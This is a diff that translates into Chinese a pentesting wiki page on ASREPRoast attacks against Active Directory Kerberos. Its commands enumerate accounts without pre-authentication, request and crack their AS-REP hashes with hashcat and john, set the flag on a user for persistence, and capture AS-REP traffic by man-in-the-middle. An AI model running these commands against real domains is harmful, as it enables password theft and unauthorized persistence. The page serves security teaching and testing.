@@ -4,31 +4,30 @@
 
 <figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和漏洞赏金猎人交流！
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**黑客洞察**\
+参与深入探讨黑客的刺激与挑战的内容
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**实时黑客新闻**\
+通过实时新闻和见解，跟上快速变化的黑客世界
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**最新公告**\
+了解最新的漏洞赏金计划和重要平台更新
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**加入我们** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，今天就开始与顶级黑客合作吧！
 
 ## ASREPRoast
 
-ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.
+ASREPRoast 是一种安全攻击，利用缺乏 **Kerberos 预身份验证所需属性** 的用户。基本上，这个漏洞允许攻击者向域控制器 (DC) 请求用户的身份验证，而无需用户的密码。然后，DC 会用用户的密码派生密钥加密的消息进行响应，攻击者可以尝试离线破解以发现用户的密码。
 
-The main requirements for this attack are:
+此攻击的主要要求是：
 
-- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
-- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
-- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.
+- **缺乏 Kerberos 预身份验证**：目标用户必须未启用此安全功能。
+- **连接到域控制器 (DC)**：攻击者需要访问 DC 以发送请求并接收加密消息。
+- **可选的域账户**：拥有域账户可以让攻击者通过 LDAP 查询更有效地识别易受攻击的用户。没有这样的账户，攻击者必须猜测用户名。
 
-#### Enumerating vulnerable users (need domain credentials)
-
+#### 枚举易受攻击的用户（需要域凭据）
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -36,9 +35,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-
-#### Request AS_REP message
-
+#### 请求 AS_REP 消息
 ```bash:Using Linux
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -50,21 +47,17 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
-
 > [!WARNING]
-> AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+> 使用 Rubeus 进行 AS-REP Roasting 将生成一个 4768，加密类型为 0x17，预身份验证类型为 0。
 
-### Cracking
-
+### 破解
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
+### 持久性
 
-### Persistence
-
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
-
+强制 **preauth** 对于您拥有 **GenericAll** 权限（或写入属性的权限）的用户不是必需的：
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -72,12 +65,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
+## 无凭证的ASREProast
 
-## ASREProast without credentials
-
-An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network without relying on Kerberos pre-authentication being disabled. It therefore works for all users on the VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.
-
+攻击者可以利用中间人位置捕获AS-REP数据包，因为它们在网络中传输，而不依赖于Kerberos预身份验证被禁用。因此，它适用于VLAN上的所有用户。\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 允许我们这样做。此外，该工具通过更改Kerberos协商强制客户端工作站使用RC4。
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -88,8 +79,7 @@ ASRepCatcher relay -dc $DC_IP --disable-spoofing
 # Passive listening of AS-REP packets, no packet alteration
 ASRepCatcher listen
 ```
-
-## References
+## 参考
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
@@ -97,18 +87,17 @@ ASRepCatcher listen
 
 <figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+加入 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 服务器，与经验丰富的黑客和漏洞赏金猎人交流！
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**黑客洞察**\
+参与深入探讨黑客的刺激与挑战的内容
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**实时黑客新闻**\
+通过实时新闻和见解，跟上快速变化的黑客世界
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**最新公告**\
+了解最新的漏洞赏金发布和重要平台更新
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**加入我们** [**Discord**](https://discord.com/invite/N3FrSbmwdy)，今天就开始与顶尖黑客合作吧！
 
 {{#include ../../banners/hacktricks-training.md}}
-
